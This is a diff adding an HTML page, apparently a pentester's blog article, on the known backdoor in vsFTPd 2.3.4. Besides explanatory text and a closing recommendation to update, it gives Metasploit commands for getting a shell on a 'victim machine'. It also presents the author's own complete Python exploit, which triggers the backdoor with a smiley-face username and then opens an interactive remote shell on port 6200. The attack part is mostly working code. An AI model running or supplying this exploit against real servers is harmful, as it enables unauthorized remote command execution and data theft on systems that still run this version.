@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Cryptography for Hackers</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        @keyframes fadeInPattern {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        @keyframes fadeInPattern2 {
+            0% { opacity: 0; }
+            100% { opacity: 0.1; }
+        }
+        .hover-glow {
+            transition: background-color 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+        }
+        .hover-glow:hover {
+            background: rgba(60,60,60,0.75);
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+        }
+        .social-icon {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+            transition: transform 0.3s ease-in-out;
+        }
+        .social-icon:hover {
+            transform: scale(1.2);
+            fill: #ffcc00;
+        }
+        .gradient-text {
+            background: linear-gradient(90deg, white, silver);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .custom-bg {
+            background-color: rgb(0, 0, 0);
+        }
+        .hover-cv, .hover-email {
+            transition: background-color 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+        }
+        .hover-email:hover, .hover-cv:hover {
+            background-color: #ffcc00;
+            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.6);
+        }
+        .left-section {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100vh;
+            width: 30%;
+            position: fixed;
+            left: 0;
+            top: 0;
+            padding-top: 2rem;
+            transition: transform 0.3s ease-in-out;
+        }
+        .right-section {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            margin-left: 30%;
+
+            min-height: 100vh;
+            padding: 2rem;
+            overflow-y: auto;
+        }
+        .content-wrapper {
+            max-width: 800px;
+            width: 100%;
+        }
+        .pattern-bg {
+            animation: fadeInPattern 3s ease-in-out forwards;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('pattern.svg');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: cover;
+            z-index: -2;
+        }
+        .gif-bg {
+            animation: fadeInPattern2 3s ease-in-out forwards;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('ss2.gif');
+            background-size: cover;
+            background-position: center;
+            opacity: 0.09;
+            z-index: -1;
+        }
+        .Sahm {
+            display: flex;
+            margin-bottom: 50px;
+        }
+        .social-icons-wrapper {
+            position: fixed;
+            bottom: 30px;
+            left: 25%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 1rem;
+            z-index: 5;
+        }
+        pre {
+            background-color: rgba(40, 44, 52, 0.8);
+            border: 1px solid #3e4451;
+            border-radius: 4px;
+            padding: 15px;
+            overflow-x: auto;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        /* Media query to hide the left section on smaller screens */
+        @media (max-width: 768px) {
+            .left-section {
+                transform: translateX(-100%);
+            }
+            .menu-icon {
+                display: block;
+            }
+            .right-section {
+                margin-left: 0;
+            }
+        }
+        /* For menu icon */
+        .menu-icon {
+            display: none;
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 10;
+            cursor: pointer;
+        }
+        /* Side menu style */
+        .side-menu {
+            display: none;
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 75%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            padding: 1rem;
+            z-index: 10;
+            transform: translateX(-100%);
+            transition: transform 0.3s ease-in-out;
+        }
+        .side-menu.open {
+            display: block;
+            transform: translateX(0);
+        }
+    </style>
+</head>
+<body class="custom-bg text-white font-sans">
+    <!-- Menu icon for mobile view -->
+    <div class="menu-icon">
+        <svg class="social-icon" xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 24 24">
+            <path d="M3 6h18v2h-18v-2zm0 5h18v2h-18v-2zm0 5h18v2h-18v-2z"/>
+        </svg>
+    </div>
+
+    <!-- Side menu for mobile view -->
+    <div class="side-menu">
+        <button class="close-menu text-2xl text-white mb-6">X</button>
+        <div class="text-center">
+            <img src="Pasted image.png" alt="Profile" class="rounded-full w-32 h-32 mb-4 mx-auto">
+            <h1 class="text-3xl font-bold gradient-text">Yassin Abdelrazik</h1>
+            <p class="text-lg text-gray-400">penetration tester | Red Team</p>
+            <button class="mt-4 py-2 px-4 bg-gray-700 text-white rounded-lg hover-email">Email me</button>
+        </div>
+    </div>
+
+    <div class="flex">
+        <!-- Left Section (Hidden on small screens) -->
+        <div class="left-section">
+            <div class="content-wrapper text-center">
+                <img src="Pasted image.png" alt="Profile" class="rounded-full w-48 h-48 mb-4 mx-auto relative z-10">
+                <h1 class="text-5xl font-bold gradient-text">Yassin Abdelrazik</h1>
+                <p class="text-xl text-gray-400">penetration tester | Red Team</p>
+                <button class="mt-4 py-2 px-4 bg-gray-700 text-white rounded-lg hover-email">Email me</button>
+            </div>
+        </div>
+
+        <!-- Right Section (Article Content) -->
+        <div class="right-section">
+            <div class="Sahm">
+                <a href="index.html" class="home-btn" style="font-size: 24px; display: flex; align-items: center;">
+                    <div style="background-color: rgba(128, 128, 128, 0.6); border-radius: 12px; padding: 10px 20px; display: flex; align-items: center; backdrop-filter: blur(5px); border: 1px solid rgba(255, 255, 255, 0.5);">
+                        <span style="font-size: 24px;">Home Page</span>
+                        <a href="p1.html" style="margin-left: 10px; display: flex; align-items: center;">
+                            <div style="background-color: gray; border-radius: 50%; padding: 5px; display: flex; justify-content: center; align-items: center;">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="white">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                                </svg>
+                            </div>
+                        </a>
+                    </div>
+                </a>
+            </div>
+                    
+            
+            <div class="content-wrapper">
+                <h1 class="text-4xl font-bold mb-6">Understanding Vulnerabilities in VSFTPD 2.3.4</h1>
+                
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">What is VSFTPD?</h2>
+                    <p class="mb-4">VSFTPD (Very Secure File Transfer Protocol Daemon) is a widely used FTP server for Unix-like systems known for its speed and security. However, like any software, it may contain vulnerabilities.</p>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">What is the Vulnerability in VSFTPD 2.3.4?</h2>
+                    <p class="mb-4">VSFTPD 2.3.4 has a well-known backdoor vulnerability. This specific version contains a malicious code that, when exploited, allows attackers to gain unauthorized access to the server. The backdoor is triggered when a user connects to the FTP service and enters a smiley face :) as the username. Once this is done, the server opens a shell on port 6200, giving the attacker control over the system.</p>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">Why Does This Vulnerability Exist?</h2>
+                    <p class="mb-4">The vulnerability is believed to have been introduced by a malicious party who tampered with the source code before its release. It's not a flaw that developers created by accident but rather a deliberate backdoor introduced into the system.</p>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">How can it be exploited through Metasploit?</h2>
+                    <p class="mb-4">Run these commands:</p>
+                    <pre><code class="language-bash">1 - msfconsole
+2 - search vsftpd
+3 - use exploit/unix/ftp/vsftpd_234_backdoor
+4 - set RHOSTS &lt;Target Ip&gt;
+5 - exploit
+### Now You Have Shell in Victim Machine ###</code></pre>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">My Exploit</h2>
+                    <pre><code class="language-python">import socket
+import sys
+import time
+
+def trigger_backdoor(ip, port=21):
+    print(f"[*] Checking FTP Version on {ip}:{port}")
+    try:
+        with socket.create_connection((ip, port), timeout=10) as sock:
+            banner = sock.recv(1024).decode()
+            version = banner.split("vsFTPd ")[1].split(")")[0]
+            if version != "2.3.4":
+                print(f"[!] Target version {version} is not vulnerable. Exploit requires vsFTPd 2.3.4.")
+                return False
+            else:
+                print("[+] Target is running vsFTPd 2.3.4. Proceeding with backdoor exploit...")
+                sock.sendall(b"USER everythingBlackkk:)\r\n")
+                sock.recv(1024) # Receive response
+                sock.sendall(b"PASS fsociety\r\n")
+                return True
+    except Exception as e:
+        print(f"[!] Error during FTP connection: {e}")
+        return False
+
+def get_shell(ip):
+    print(f"[*] Connecting to backdoor on {ip}:6200...")
+    time.sleep(1)
+    try:
+        with socket.create_connection((ip, 6200), timeout=10) as sock:
+            print("[+] Connection successful! You now have shell access.")
+            while True:
+                command = input("$ ").strip()
+                if command.lower() in ['exit', 'quit']:
+                    break
+                sock.sendall(f"{command}\n".encode())
+                response = sock.recv(4096).decode()
+                print(response, end='')
+    except Exception as e:
+        print(f"[!] Failed to connect to backdoor: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3 or sys.argv[1] != "-host":
+        print("Usage: python3 script.py -host &lt;target_ip&gt; [port]")
+        sys.exit(1)
+    
+    target_ip = sys.argv[2]
+    target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 21
+    
+    print("[*] Initiating FTP backdoor exploit...")
+    if trigger_backdoor(target_ip, target_port):
+        get_shell(target_ip)
+
+# Usage: python3 exploit.py -host &lt;target_ip&gt;</code></pre>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">Why is it Dangerous?</h2>
+                    <p class="mb-4">Once the backdoor is exploited, attackers can gain full access to the server, execute commands, steal sensitive data, or launch further attacks on the network. This makes it a severe threat to systems running this version.</p>
+                </div>
+
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4">Conclusion</h2>
+                    <p class="mb-4">VSFTPD 2.3.4 vulnerability demonstrates the importance of keeping software up to date and only downloading from trusted sources. If you're running this version, it's crucial to update to a newer, secure version to protect your system from potential attacks.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+
+    <div class="gif-bg"></div>
+    <div class="pattern-bg"></div>
+
+    <script>
+        // Toggle side menu
+        const menuIcon = document.querySelector('.menu-icon');
+        const sideMenu = document.querySelector('.side-menu');
+        const closeMenuBtn = document.querySelector('.close-menu');
+
+        menuIcon.addEventListener('click', () => {
+            sideMenu.classList.toggle('open');
+        });
+
+        closeMenuBtn.addEventListener('click', () => {
+            sideMenu.classList.remove('open');
+        });
+    </script>
+</body>
+</html>
